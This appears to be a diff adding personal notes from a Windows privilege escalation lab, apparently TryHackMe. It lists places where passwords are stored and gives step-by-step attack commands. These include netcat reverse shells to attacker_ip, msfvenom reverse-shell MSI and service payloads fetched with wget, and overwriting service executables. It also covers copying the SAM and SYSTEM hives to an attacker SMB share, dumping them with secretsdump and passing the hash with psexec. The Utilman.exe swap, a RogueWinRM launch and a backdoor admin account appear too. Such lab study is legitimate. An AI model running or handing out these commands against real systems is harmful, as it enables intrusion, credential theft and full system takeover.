@@ -1,0 +1,174 @@
+Harvesting Password from Usual Spots
+
+1. Unattended Windows Installation
+C:\Unattend.xml;
+C:\Windows\Panther\Unattend.xml;
+C:\Windows\Panther\Unattend\Unattend.xml;
+C:\Windows\system32\sysprep.inf;
+C:\Windows\system32\sysprep\sysprep.xml.
+
+
+2. PowerShell History
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (only in cmd.exe)
+
+
+3. Saved Windows Credentials
+cmdkey /list
+runas /savecred /user:admin cmd.exe
+
+
+4. IIS Configuration
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+
+5. Retrieve Credentials from Software: PuTTy
+req query HKEY_CURRENT_USER\Software\SimonTatham\PuTTy\Sessions\ /f "Proxy" /s
+
+
+Other Quick Wins
+
+1. Scheduled Tasks
+schtasks /query /tn vulntask /fo list /v (de interes Task to run and Run as User)
+icacls c:\tasks\schtask.bat (we found BUILTIN\Users:(I)(F) - full access)
+Let's modify this to spawn a reverse shell:
+echo c:\tools\nc.64.exe -e cmd.exe attacker_ip 4444 > C:\tasks\schtask.bat
+on the attacker machine (nc -lnvp 4444)
+on the target machine (schtasks /run /tn vulntask) - you have the SHELL OPEN!!
+
+
+2.AlwaysInstallElevated
+.msi files are used to install apps on the system
+generate a malicious .msi file that would run with admin privileges
+set the required two registry:
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+req query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+On the attacker machine (msfvenom -p windows/x64/shell_reverse_tcp LHOST=Attacker_ip LPORT=8888 -f msi -o malicious.msi + python3 -m http.server)
+On the target machine 	PS>		wget http://attacker_ip:8000/malicious.msi -O malicious.msi
+			cmd.exe> 	move C:\Users\currentusser\malicious.msi C:\Windows\Temp\malicious.msi
+					msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+Abusing Service Misconfigurations
+
+1. Windows Servcies
+to better understand the strucuture of a service (sc qc apphostsvc)
+all of the services configurations are stored on the registry under: HKLM\SYSTEM\CurrentControlSet\Services\
+
+
+2. Insecure Permissions on Service Executable - we can write into service executables
+sq qc WindowsScheduler (service_start_name and Binary_path_name)
+we check the permissions on the executable (icacls Binary_path_name  -eq C:\PROGRA~2\SYSTEM~1\WService.exe) - we found Everyone group has modify (M) permissions
+we can overwrite it with a payload of our preference
+we generate an exe-service payload on the attacker machine (msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4445 -f exe-service -o rev-svc.exe)
+we start an http server on the attacker machine (python3 -m http.server)
+on the target machine	PS>	wget http://attacker_ip:8000/rev-svc.exe -O rev-svc.exe
+			cmd>	cd C:\PROGRA~2\SYSTEM~1\
+				move WService.exe WService.exe.bkp
+				move C:\Users\currentuser\rev-svc.exe WService.exe
+				icacls WService.exe /grant Everyone:F
+on the attacker machine, we start a TCP listener (nc -lnvp 4445)
+on the target machine:	sc stop windowsscheduler
+			sc start windowsscheduler - SHELL OPEN!!!!
+
+
+3. Unquoted Service Paths - when we can't directly write into service executable
+we look for a service with a proper quonotation
+sc qc "disk sorter enterprise" (service_start_name and Binary_path_name - eg: C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe)
+
+When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:
+Command							Argument 1				Argument 2
+C:\MyPrograms\Disk.exe					Sorter				Enterprise\bin\disksrs.exe
+C:\MyPrograms\Disk Sorter.exe				Enterprise\bin\disksrs.exe	
+C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe		
+
+This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.
+
+Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:
+
+    1. First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
+    2. If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
+    3. If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.
+
+
+icacls c:\MyPrograms (we found BUILTIN\Users AD and WD)
+we generate an exe-service payload on the attacker machine (msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4446 -f exe-service -o rev-svc2.exe) + python3 -m http.server + nc -nvlp 4446
+on the target machine	PS>	wget http://attacker_ip:8000/rev-svc2.exe -O rev-svc2.exe
+			cmd>	cd C:\MyProgram
+				move Disk.exe Disk.exe.bkp
+				move C:\Users\currentuser\rev-svc2.exe Disk.exe
+				icacls Disk.exe /grant Everyone:F
+sc stop "disk sorter enterprise"
+sc start "disk sorter enterprise" - SHELL OPEN!!!
+
+
+4. Insecure Service Permissions
+check for a service DACL (accesschk64.exe-qlc thmservice
+ -qlc thmservice) - we found BUILTIN\Users SERVICE_ALL_ACCESS
+we generate an exe-service payload on the attacker machine (msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4447 -f exe-service -o rev-svc3.exe) + python3 -m http.server + nc -nvlp 4447
+on the target machine	PS>	wget http://attacker_ip:8000/rev-svc3.exe -O rev-svc3.exe
+			cmd>	cd C:\Users\currentuser\
+				icacls rev-svc3.exe /grant Everyone:F
+				sc config THMService binPath="C:\Users\currentuser\rev-svc3.exe" obj= LocalSystem
+sc stop THMService
+sc start THMService - SHELL OPEN!!!
+
+
+Abusing dangerous privileges
+
+1. Windows Privileges
+whoami /priv - list of available privileges on Windows https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
+
+
+2. SeBackup/ SeRestore
+allow users to read and write to any file in the system, ignoring DACL in place
+Exploit - extract the local Administrator's password hash from the SAM and SYSTEM registry hives
+connect via rdp to windows server (remmina) and open cmd as administrator (user THMBackup)
+backup the SAM and SYSTEM hashes (reg save hklm\system C:\Users\THMBackup\system.hive + reg save hklm\sam C:\Users\THMBackup\sam.hive)
+copy this file on the attacker machine using SMB (using smbserver.py)
+on the attacker machine:	mkdir share
+				python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+on the target machine:		copy C:\Users\THMBackup\sam.hive \\attacker_IP\public\
+				copy C:\Userc\THMBackup\system.hive \\attacker_IP\public\
+on the attacker machine:	cd share
+				python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+				python3 /opt/impacket/examples/psexec.py -hashes *password_hash* administrator@target_IP - YOU ARE NT AUTHORITY\SYSTEM!!!!
+
+
+3. SeTakeOwnership
+allows users to take ownership of any object on the system, including files and registry keys
+we search for a service running as SYSTEM and take ownership of the service's executable
+connect via rdp to windows server (remmina) and open cmd as administrator (user THMTakeOwnership)
+whoami /priv
+we will abuse utilman.exe to escalate privileges
+we will replace utilman
+start by taking ownership of it (takeown /f C:\Windows\System32\Utilman.exe)
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+cd C:\Windows\System32
+copy cmd.exe utilman.exe
+lock our screen from the start button
+finally, proceed to click on the "Ease of access" button, which runs utilman.exe with SYSTEM privileges - YOU ARE NT AUTHORITY\SYSTEM!!!
+
+
+4.SeImpersonate/ SeAssignPrimaryToken
+allow a process to impersonate other users and act on their behalf
+In windows systems, LOCAL SERVICE and NETWORK SERVICE ACCOUNT have such privileges. IIS wil also create a similar default account called "iis apppool/defaultapppool" for web apps.
+Let's assume we already compromised a website running on IIS and that we have planted a web shell on the following address: http://IP/
+whoami /priv
+upload the exploit to the target machine (RogueWinRM)
+on the attacker machine we start a tcp listener (nc -lnvp 4442)
+on the target machine: c:\tools\RogueWinRM\RogueWinRM.exe -p "c:\tools\nc64.exe" -a "-e cmd.exe attacker_ip 4442" - YOU ARE NT AUTHORITY\SYSTEM!!!
+
+
+Abusing vulnerable software
+
+1. Unpatched Software
+list software installed on the target system and its versions (wmic product get name,version,vendor)
+search for existing exploits (exploit-db, packet storm, google, etc.)
+
+
+2. Case study: Druva inSync 6.6.3
+Druva_isSynx_exploit.txt
+change: net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
+run the exploit in powershell
+check the user (net user pwnd)
+run cmd as administrator and use pwnd account - YOU ARE NT AUTHORITY\SYSTEM!!!!
